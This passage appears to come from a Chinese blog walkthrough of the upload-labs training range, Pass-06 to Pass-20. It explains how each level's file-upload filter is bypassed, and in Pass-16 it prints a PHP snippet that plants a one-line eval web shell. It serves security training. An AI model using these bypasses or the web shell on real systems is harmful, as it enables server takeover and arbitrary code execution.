src="/2024/07/25/upload%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93/image-20240716162318150.png" alt="image-20240716162318150"></p><h3 id="Pass-06"><a href="#Pass-06" class="headerlink" title="Pass-06"></a>Pass-06</h3><p>提示：本pass禁止上传（同上）<br>解决方法：查看源码，发现没有首尾去空，利用BurpSuite抓包，在文件后缀加上一个空格即可绕过<br>漏洞原理：网页通过后端进行黑名单检查，黑名单较全，查看源码后发现过滤代码没有去除文件名末尾的空格，可以先上传文件，抓取上传文件的数据包，在文件名末尾加上空格，利用Windows系统特性（文件名末尾自动去除空格），上传的文件在进入文件夹之后末尾是没有空格的，导致任意文件上传。Linux系统暂未测试</p><p><img src="/2024/07/25/upload%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93/image-20240716162616023.png" alt="image-20240716162616023"></p><p><img src="/2024/07/25/upload%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93/image-20240716162631560.png" alt="image-20240716162631560"></p><h3 id="Pass-07"><a href="#Pass-07" class="headerlink" title="Pass-07"></a>Pass-07</h3><p>提示：本pass禁止上传所有可以解析的后缀！<br>解决方法：查看源码，发现没有删除文件名末尾的点，利用BurpSuite抓包，在文件名末尾加点即可绕过<br>漏洞原理：网页使用后端进行黑名单检查，黑名单较全，查看源码后发现过滤代码中没有删除文件名末尾的点，可以先上传文件，抓取上传文件的数据包，在文件名末尾加上点，利用Windows系统特性（文件名末尾自动去除点），在文件上传到文件夹之后末尾是没有点的，导致任意文件上传。Linux系统暂未测试</p><p><img src="/2024/07/25/upload%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93/image-20240716163952953.png" alt="image-20240716163952953"></p><p><img src="/2024/07/25/upload%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93/image-20240716162931320.png" alt="image-20240716162931320"></p><h3 id="Pass-08"><a href="#Pass-08" class="headerlink" title="Pass-08"></a>Pass-08</h3><p>提示：本pass禁止上传（同上）<br>解决方法：查看源码，发现没有去除字符串<code>::$DATA</code>，利用BurpSuite抓包，在文件名末尾加上<code>::$DATA</code>即可绕过<br>漏洞原理：网页使用后端进行黑名单检查，黑名单较全，查看源码后发现过滤代码中没有去除字符串<code>::$DATA</code>，了解到在Windows系统中如果文件名+<code>::$DATA</code>会把<code>::$DATA</code>之后的数据当成文件流处理，不会检测后缀名，且保持<code>::$DATA</code>之前的文件名，它的<strong>目的</strong>就是<strong>不检查后缀名</strong>只需先上传文件，抓取上传文件的数据包，在文件名后加上<code>::$DATA</code>就可以绕过过滤代码检测，导致任意文件上传</p><p><img src="/2024/07/25/upload%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93/image-20240716163212208.png" alt="image-20240716163212208"></p><p><img src="/2024/07/25/upload%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93/image-20240716163229376.png" alt="image-20240716163229376"></p><h3 id="Pass-09"><a href="#Pass-09" class="headerlink" title="Pass-09"></a>Pass-09</h3><p>提示：本pass只允许上传.jpg|.png|.gif后缀的文件！<br>解决方法：查看源码，发现空格和点只过滤了一遍，且没有对文件重命名。利用BurpSuite抓包，在文件名末尾加一个空格和点即可绕过<br>漏洞原理：网页使用后端进行白名单检查，过滤代码详细，但代码中对文件名末尾的空格和点都只过滤了一遍，只需先上传文件，抓取上传文件的数据包，在文件名末尾添加一个空格和点即可导致任意文件上传</p><p><img src="/2024/07/25/upload%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93/image-20240716164033904.png" alt="image-20240716164033904"></p><p><img src="/2024/07/25/upload%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93/image-20240716164046848.png" alt="image-20240716164046848"></p><h3 id="Pass-10"><a href="#Pass-10" class="headerlink" title="Pass-10"></a>Pass-10</h3><p>提示：本pass会从文件名中<strong>去除</strong>（黑名单同上），重点：<strong>去除</strong>而不是禁止上传<br>解决方法：查看源码，发现只去除一次，利用双写即可绕过<br>漏洞原理：网页使用后端进行黑名单检查，查看源码发现过滤代码检测到黑名单中的字符后会进行删除，但是只删除一次。只需先上传文件，抓取上传文件的数据包，在文件名末尾进行后缀双写（如.php可双写为.pphphp）即可绕过检测代码，导致任意文件上传</p><p><img src="/2024/07/25/upload%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93/image-20240716164501671.png" alt="image-20240716164501671"></p><p><img src="/2024/07/25/upload%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93/image-20240716164525160.png" alt="image-20240716164525160"></p><h3 id="Pass-11"><a href="#Pass-11" class="headerlink" title="Pass-11"></a>Pass-11</h3><p>提示：本pass上传路径可控！<br>解决方法：白名单绕过，%00截断，GET型绕过，在上传路径后面加上php文件名，再将自己上传的php文件名改成其他即可绕过<br>条件：php版本&lt;5.3.4，php.ini的magic_quotes_gpc为OFF<br>漏洞原理：网页使用后端进行白名单检查，但发现网站的上传文件路径是以GET方式提交的，只需先上传木马文件，抓取上传文件的数据包，在文件路径后添加随意文件名的php文件（如：123.php），在后缀末尾添加<code>%00</code>进行截断，再将自己上传的文件名后缀修改为其他文件类型（如：jpg、png、gif）通过白名单检测即可绕过所有检测机制，导致任意文件上传</p><p><img src="/2024/07/25/upload%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93/image-20240716164931918.png" alt="image-20240716164931918"></p><p><img src="/2024/07/25/upload%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93/image-20240716165035747.png" alt="image-20240716165035747"></p><h3 id="Pass-12"><a href="#Pass-12" class="headerlink" title="Pass-12"></a>Pass-12</h3><p>提示：本pass上传路径可控！<br>解决方法：白名单绕过，%00截断（需要url编码），POST型绕过，在上传路径后面加上php文件名，再将自己上传的php文件名改成其他即可绕过<br>漏洞原理：本题与上题类似，只不过上传路径的提交方式变为POST类型，只需先上传木马文件，抓取上传文件的数据包，在上传路径末尾添加随意文件名的php文件（如：123.php），在后缀末尾添加<code>%00</code>进行截断，且<code>%00</code>要使用url解码，再将自己上传的文件名后缀修改为其他文件类型（如：jpg、png、gif）通过白名单检测即可绕过所有检测机制，导致任意文件上传</p><p><img src="/2024/07/25/upload%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93/image-20240716165229890.png" alt="image-20240716165229890"></p><p><img src="/2024/07/25/upload%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93/image-20240716165300721.png" alt="image-20240716165300721"></p><h3 id="Pass-13"><a href="#Pass-13" class="headerlink" title="Pass-13"></a>Pass-13</h3><p>提示：本pass检查图标内容开头2个字节！<br>解决方法：将文件头修改为对应白名单内的文件头即可绕过<br>漏洞原理：网站使用后端对文件内容进行白名单检查，但只检查开头两个字节，明显为检查文件头判断文件类型，通过检查$file_type是否存在来进行拦截，可以上传图片马进行绕过。可以使用DOS中的copy命令将图片文件和木马合成为一个图片上传，再通过网页给的文件包含漏洞进行攻击</p><p>GIF：</p><p><img src="/2024/07/25/upload%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93/image-20240716165456868.png" alt="image-20240716165456868"></p><p><img src="/2024/07/25/upload%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93/image-20240716165537223.png" alt="image-20240716165537223"></p><p>PNG：<br><img src="/2024/07/25/upload%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93/image-20240716165633657.png" alt="image-20240716165633657"></p><p>JPG：<br><img src="/2024/07/25/upload%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93/image-20240716165711649.png" alt="image-20240716165711649"></p><h3 id="Pass-14"><a href="#Pass-14" class="headerlink" title="Pass-14"></a>Pass-14</h3><p>提示：本pass使用getimagesize()检查是否为图片文件！<br>解决方法：与上题相同，但木马文件需要以一个正常的图片文件和一个木马php用copy命令合成即可绕过<br>漏洞原理：过滤代码检查上传文件的图像大小和图像格式，只需上传合成的图片马即可</p><h3 id="Pass-15"><a href="#Pass-15" class="headerlink" title="Pass-15"></a>Pass-15</h3><p>提示：本pass使用exif_imagetype()检查是否为图片文件！<br>解决方法：与上题相同<br>条件：需要服务器开启php_exif扩展模块<br>漏洞原理：过滤代码读取上传图像的第一个字节并检查其签名，只需上传合成的图片马即可</p><h3 id="Pass-16"><a href="#Pass-16" class="headerlink" title="Pass-16"></a>Pass-16</h3><p>提示：本pass重新渲染了图片！<br>解决方法：先上传木马文件，将上传后的文件与源文件进行比对，判断未渲染的地方，将代码插入到没有被渲染的地方即可绕过<br>漏洞原理：网页后端代码对上传的图片马做了处理，删掉了php代码，或是删掉了包含php代码的部分，这里提供两种方法：</p><ol><li><p>上传图片马（这里以gif演示）对比上传前和上传后的文件之间的差异，然后将php代码插入未修改的地方</p></li><li><p>如果图片上传后先保存为可预知的路径和文件名，然后才进行去除php代码的处理，可以使用条件竞争，不断上传图片，图片中包含写一句话木马文件的php代码，不断利用文件包含漏洞访问图片，触发写一句话木马的语句。以下是图片马中的一句话木马，跟之前的不太一样。</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> php <span class="title function_ invoke__">fputs</span>(<span class="title function_ invoke__">fopen</span>(<span class="string">&#x27;shell.php&#x27;</span>,<span class="string">&#x27;w&#x27;</span>),<span class="string">&#x27;&lt;?php @eval($_POST[&quot;123&quot;])?&gt;&#x27;</span>);<span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//解释：</span></span><br><span class="line"><span class="comment">//当浏览器访问这个文件的时候，此文件会在当前目录下创建一个名为shell.php的文件，内容为：</span></span><br><span class="line"><span class="comment">//&lt;?php @eval($_POST[&quot;123&quot;])?&gt;</span></span><br><span class="line"><span class="comment">//之后就可以通过shell.php这个文件进行攻击</span></span><br></pre></td></tr></table></figure></li></ol><p><img src="/2024/07/25/upload%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93/image-20240716170157576.png" alt="image-20240716170157576"></p><p><img src="/2024/07/25/upload%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93/image-20240716170139273.png" alt="image-20240716170139273"></p><h3 id="Pass-17"><a href="#Pass-17" class="headerlink" title="Pass-17"></a>Pass-17</h3><p>提示：需要代码审计！<br>解决方法：查看源码，发现其使用<code>move_uploaded_file()</code>，无论上传什么文件，都会先临时保存在服务器上，再通过判断进行重命名保存或删除。可以使用条件竞争方式，使用BurpSuite进行无限重发和其他脚本循环访问，总有一刻服务器会来不及删除文件，这时即可绕过。<br>漏洞原理：此pass使用的判断代码会将上传的任何文件先放入服务器的临时存放目录，造成安全隐患。攻击者可以使用条件竞争的方式，构造特定的shell语句，无限发送这个木马文件至服务器，同时使用脚本循环访问这个文件，当服务器来不及处理文件的时候，就被攻击者创建了本地shell文件了</p><p><img src="/2024/07/25/upload%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93/image-20240717082950860.png" alt="image-20240717082950860"></p><p><img src="/2024/07/25/upload%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93/image-20240717083035199.png" alt="image-20240717083035199"></p><p><img src="/2024/07/25/upload%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93/image-20240717083105428.png" alt="image-20240717083105428"></p><p><img src="/2024/07/25/upload%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93/image-20240717083532017.png" alt="image-20240717083532017"></p><p><img src="/2024/07/25/upload%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93/image-20240717083603333.png" alt="image-20240717083603333"></p><h3 id="Pass-18"><a href="#Pass-18" class="headerlink" title="Pass-18"></a>Pass-18</h3><p>提示：需要代码审计！<br>解决方法：程序来不及rename时通过竞争条件上传shell<br>BUG：这个关卡的php代码出了些问题，导致它的上传目录为根，且文件名前有upload（人话：上传时php代码内upload后面没加<code>/</code>）<br>漏洞原理：同上，条件竞争</p><p><img src="/2024/07/25/upload%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93/image-20240717095151289.png" alt="image-20240717095151289"></p><p><img src="/2024/07/25/upload%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93/image-20240717095247532.png" alt="image-20240717095247532"></p><p>使用BurpSuite抓包无限重发，再使用python脚本进行循环访问</p><p><img src="/2024/07/25/upload%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93/image-20240717095501674.png" alt="image-20240717095501674"></p><p><img src="/2024/07/25/upload%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93/image-20240717100109628.png" alt="image-20240717100109628"></p><h3 id="Pass-19"><a href="#Pass-19" class="headerlink" title="Pass-19"></a>Pass-19</h3><p>提示：本pass的取文件名通过$_POST来获取。<br>解决方法：通过CVE-2015-2348漏洞，在文件名后添加<code>./</code>进行截断即可绕过<br>漏洞原理：此pass的文件名由用户自己填写，但判断代码move_uploaded_file的目的路径参数可以使用空字符截断，绕过jpg，png上传类型的检测，从而导致任意文件上传。检查代码后发现在高版本（受影响版本中），<strong>PHP把长度比较的安全检查逻辑给去掉了</strong>，导致了漏洞的发生。漏洞代码为CVE-2015-2348</p><p><img src="/2024/07/25/upload%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93/image-20240717091041216.png" alt="image-20240717091041216"></p><p><img src="/2024/07/25/upload%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93/image-20240717091104302.png" alt="image-20240717091104302"></p><p><img src="/2024/07/25/upload%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93/image-20240717091114514.png" alt="image-20240717091114514"></p><h3 id="Pass-20"><a href="#Pass-20" class="headerlink" title="Pass-20"></a>Pass-20</h3><p>提示：Pass-20来源于CTF，请审计代码！<br>解决方法：这里我们可以定义一个数组，利用如下代码构造数组来绕过</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$file_name</span> = <span class="title function_ invoke__">reset</span>(<span class="variable">$file</span>) . <span class="string">&#x27;.&#x27;</span> . <span class="variable">$file</span>[<span class="title function_ invoke__">count</span>(<span class="variable">$file</span>) - <span class="number">1</span>];</span><br></pre></td></tr></table></figure><p>正常上传一句话（这里需要将一句话改成图片文件来绕过MIME校验）<br><img src="/2024/07/25/upload%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93/image-20240717092226917.png" alt="image-20240717092226917"></p><p>使用BurpSuite修改数据包<br><img src="/2024/07/25/upload%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93/image-20240717092653730.png" alt="image-20240717092653730"></p><p><img src="/2024/07/25/upload%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93/image-20240717092722671.png" alt="image-20240717092722671"></p><p><img src="/2024/07/25/upload%E9%9D%B6%E5%9C%BA%E6%80%BB%E7%BB%93/image-20240717092744891.png" alt="image-20240717092744891"></p><p>漏洞原理：前面MIME的校验很好绕过，关键是这句<code>$file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1];</code>，文件名的组成是打散后的第一个元素+点+最后一个数组元素，用户可控的就是元素值，而且元素值是以点区分的。再往前看，<code>if (!is_array($file))</code>这句话有点奇怪，为什么要判断文件名是不是数组呢？如果上传的文件名本来就是数组，那这句话就能绕过，而且数组内容用户可以自己定制。所以直接将文件名改为数组，从而绕过了数组打散，而<code>save_name[2</code>]中的jpg也可以绕过后缀白名单的过滤，文件名形成的后缀是索引为数组长度减一的元素<code>save_name[1</code>]，而<code>save_name[1]</code>我们没有设置，所以直接为空。最后文件名拼接应该为<code>ma.php.</code> ，此时由因为windows的特性（自动去除文件名末尾的点），会在保存文件时自动去除后缀末尾的点。</p><p>Pass-20特点：本关来自真实CTF，突破点主要在<code>if (!is_array($file))</code>和<code>$file_name = reset($file) . &#39;.&#39; . $file[count($file) - 1];</code>这两句话，比较特殊的是构造一个数组文件名绕过，并且结合Windows的特性。</p><p>结束，下播！</p>]]></content>
      
      
      
    </entry>
    
    
  
  
</search>
